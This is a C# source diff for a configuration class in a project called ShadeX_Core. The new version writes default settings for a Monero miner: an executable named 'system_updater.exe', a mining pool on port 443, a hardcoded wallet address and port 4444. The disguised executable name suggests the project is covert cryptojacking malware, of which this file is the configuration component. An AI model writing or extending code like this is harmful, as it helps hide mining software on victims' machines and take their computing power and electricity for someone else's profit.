@@ -10,70 +10,67 @@ namespace ShadeX_Core
 {
     public class ConfigFile
     {
-        private string path;
-        private char separator = '=';
+        private string file;
 
-        public ConfigFile(string path)
+        private string[] DEFAULT_CONFIG_FILE = new string[] {
+            "device_id=",
+            "miner_file=system_updater.exe",
+            "port=4444",
+            "pool_adress=pool.minexmr.com:443",
+            "wallet_adress=45QNrDDCXPAdh87hS8FuXKKdXkxS3p8kg5GjWY5hfhk3F3RcuTKkowiLPdkjujUUeHibzCo1RribBiGC9xKvfFLR4fLeKGr",
+            "opencl=0",
+            "cuda=0"
+        };
+
+        public ConfigFile(string file)
         {
-            if (!File.Exists(path)) { File.WriteAllText(path,""); }
-            this.path = path;
+            this.file = file;
+
+            if(!File.Exists(file))
+            {
+                File.WriteAllLines(file,DEFAULT_CONFIG_FILE);
+            }
         }
 
-        private bool FileIsBussy(FileInfo file)
+        public void Update(string[] fileContent)
         {
-            try
-            {
-                using (FileStream stream = file.Open(FileMode.Open, FileAccess.Read, FileShare.None))
-                {
-                    stream.Close();
-                }
-            }
-            catch (IOException)
-            {
-                return true;
-            }
-            return false;
+            File.WriteAllLines(file, fileContent);
         }
 
-        public string GetValue(string key)
+        public void Update(string name,string value)
         {
-            while (FileIsBussy(new FileInfo(path))) { Console.WriteLine("File IS BUSSY"); };
-            string value = string.Empty;
-            foreach (string line in File.ReadAllLines(path))
+            List<string> newFile = new List<string>();
+
+            foreach(string line in File.ReadAllLines(file))
             {
-                if (line.Split(separator)[0] == key)
+                string[] splitedLine = line.Split('=');
+
+                if(splitedLine[0] == name) 
                 {
-                    value = line.Split(separator)[1];
+                    newFile.Add(name + "=" + value);
+                }
+                else
+                {
+                    newFile.Add(line);
                 }
             }
-            return value;
+
+            Update(newFile.ToArray());
         }
 
-        public void SetValue(string key, string value)
+        public string GetValue(string name)
         {
-            while (FileIsBussy(new FileInfo(path))) { Console.WriteLine("File IS BUSSY"); };
-            string[] fileContent = File.ReadAllLines(path);
-            List<string> newFileContent = new List<string>();
-            if (fileContent.Length > 0)
+            string[] data = File.ReadAllLines(file);
+
+            foreach(string line in data)
             {
-                foreach (string line in fileContent)
+                string[] splitedLine = line.Split('=');
+                if(splitedLine[0] == name)
                 {
-                    if (line.Split(separator)[0] == key)
-                    {
-                        newFileContent.Add(key + separator + value);
-                    }
-                    else
-                    {
-                        newFileContent.Add(line);
-                    }
+                    return splitedLine[1];
                 }
             }
-            else
-            {
-                newFileContent.Add(key + separator + value);
-            }
-
-            File.WriteAllLines(path, newFileContent.ToArray());
+            return string.Empty;
         }
     }
 }
